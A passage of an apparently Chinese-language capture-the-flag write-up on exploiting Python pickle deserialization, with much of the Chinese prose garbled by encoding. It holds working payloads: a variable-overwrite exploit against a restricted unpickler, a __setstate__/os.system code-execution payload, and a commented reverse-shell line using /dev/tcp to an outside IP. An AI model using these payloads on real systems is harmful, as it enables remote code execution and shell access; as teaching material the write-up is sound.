&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;No... I don&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t like R-things. No Rabits, Rats, Roosters or RCEs.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Are you sure that is an animal???&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">correct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_result.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">giveflag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">correct&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something wrong&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sample_obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ä¸€ç»™æˆ‘å“©giaogiao&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Giao&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_page.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹æºç ï¼Œopcodeéƒ¨åˆ†banæ‰äº†&lt;code>R&lt;/code>æ“ä½œç ï¼ˆè°ƒç”¨ä¸€ä¸ªcallableå¯¹è±¡ï¼‰ï¼Œä¸èƒ½ç”¨&lt;code>__reduce__&lt;/code>äº†ï¼›ä¹Ÿé‡å†™äº†&lt;code>find_class()&lt;/code>ï¼Œmoduleå¿…é¡»æ˜¯&lt;code>__main__&lt;/code>ï¼›æˆ‘ä»¬çš„ç›®æ ‡æ˜¯&lt;/p>
&lt;p>&lt;code>restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)&lt;/code>ä¸ºçœŸï¼Œå³correct==True&lt;/p>
&lt;p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡åŠ è½½&lt;code>__main__.secret&lt;/code>å¯ä»¥å¼•å…¥secretæ¨¡å—ï¼Œæ¥æŠŠ&lt;code>secret.name&lt;/code>å’Œ&lt;code>secret.category&lt;/code>è¿™ä¸¤ä¸ªå˜é‡è¦†ç›–ä¸ºä»»æ„å­—ç¬¦ä¸²ï¼Œå†ä»¥è¿™ä¸ªå­—ç¬¦ä¸²ä¸ºå‚æ•°æ„é€ Animalå¯¹è±¡ï¼ˆæ ˆé¡¶å¯¹äºtypeçš„æ£€æŸ¥ï¼‰&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#34;c__main__\nsecret\np0\n0g0\n(}(S&amp;#39;name&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtbg0\n(}(S&amp;#39;category&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtb(S&amp;#39;frieggs&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ni__main__\nAnimal\np3\n0g3\n.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ„é€ çš„exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;y&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#39;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”æ‰€ä»¥åœ¨ä¸å…è®¸&lt;code>b'R'&lt;/code>çš„æƒ…å†µä¸‹ï¼Œæ€è·¯åˆ™æ˜¯ç¯¡æ”¹secretä¸­çš„nameå’Œcategoriyï¼Œå•çº¯çš„ç”¨&lt;code>b'c'&lt;/code>å¼•å…¥æ¨¡å—å¯¹Animalè¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™ä¸€è¿‡ç¨‹ä¹Ÿç›¸å½“äºæ˜¯æ‰§è¡Œäº†å‡½æ•°&lt;/p>
&lt;/details>
&lt;p>ä¸€ç§è§£å†³åŠæ³•å°±æ˜¯è¿™ä¸ªæ —å­ä¸­çš„ï¼Œå¹²è„†å°±ä¸rceï¼Œè€Œæ˜¯ç”¨&lt;code>b'c'&lt;/code>å˜é‡è¦†ç›–ï¼Œæ€è·¯å°±æ˜¯ä¸Šä¸ªä¸‰çº§æ ‡é¢˜ä¸‹é¢çš„é‚£ä¸ªå¤§æ®µï¼Œä¸å†èµ˜è¿°ã€‚&lt;/p>
&lt;h3 id="--ä½¿ç”¨__setstate__bbå®ç°rce">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>__setstate__&lt;/code>&amp;amp;&lt;code>b'b'&lt;/code>å®ç°rce&lt;/h3>
&lt;p>å¦ä¸€ç§æ–¹å¼æ˜¯ç”¨BUILDæŒ‡ä»¤&lt;code>b'b'&lt;/code>åŠè¿›è¡Œrceã€‚&lt;/p>
&lt;p>åœ¨pickleæºç ä¸­BUILDæŒ‡ä»¤æ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://pic2.zhimg.com/80/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img">&lt;/p>
&lt;p>å¦‚æœä¸€ä¸ªå®ä¾‹instæ‹¥æœ‰&lt;code>__setstate__&lt;/code>æ–¹æ³•ï¼Œåˆ™æŠŠ&lt;code>state&lt;/code>äº¤ç»™&lt;code>__setstate__&lt;/code>æ–¹æ³•æ¥å¤„ç†ï¼›å¦åˆ™ç›´æ¥æŠŠ&lt;code>state&lt;/code>è¿™ä¸ª&lt;code>dist&lt;/code>çš„å†…å®¹åˆå¹¶åˆ°&lt;code>inst.__dict__ &lt;/code>å†…ã€‚&lt;/p>
&lt;p>å¦‚æœä¸€ä¸ªç±»åŸæœ¬æ²¡æœ‰&lt;code>__setstate__&lt;/code>è¿™ä¸ªæ–¹æ³•ï¼Œå½“æˆ‘ä»¬ç”¨&lt;code>{'__setstate__': os.system}&lt;/code>æ¥BUILDè¿™ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆç°åœ¨å¯¹è±¡çš„&lt;code>__setstate__&lt;/code>å°±å˜æˆäº†&lt;code>os.system&lt;/code>ï¼›æ¥ä¸‹æ¥åˆ©ç”¨&lt;code>&amp;quot;ls /&amp;quot;&lt;/code>æ¥å†æ¬¡BUILDè¿™ä¸ªå¯¹è±¡ï¼Œåˆ™ä¼šæ‰§è¡Œ&lt;code>setstate(&amp;quot;ls /&amp;quot;)&lt;/code> ï¼Œè€Œæ­¤æ—¶&lt;code>__setstate__&lt;/code>å·²ç»è¢«æˆ‘ä»¬è®¾ç½®ä¸º&lt;code>os.system&lt;/code>ï¼Œå› æ­¤å®ç°äº†rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;amelia&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">grade&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;A1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Student&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">}(V__setstate__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">cos&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">system&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">ubVls /&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">b.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># shell = b&amp;#34;&amp;#34;&amp;#34;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubS&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;\nb.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025215320.png" alt="image-20210810025215320">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025143114.png" alt="image-20210810025143114">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆåŠŸåšåˆ°äº†rce~~åå¼¹shellå½“ç„¶ä¹Ÿå¯ä»¥&lt;/p>
&lt;h3 id="--ä½¿ç”¨_instantiateload_objload_instbobiå®ç°rce">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>_instantiate()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>&amp;amp;&lt;code>b'o'&lt;/code>&amp;amp;&lt;code>b'i'&lt;/code>å®ç°rce&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>_instantiate()&lt;/code>: Create a new object via klass(*args); Leads to arbitrary function call actually&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">hasattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;__getinitargs__&amp;#34;&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Arbitrary function all&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;in constructor for &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">: &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span>
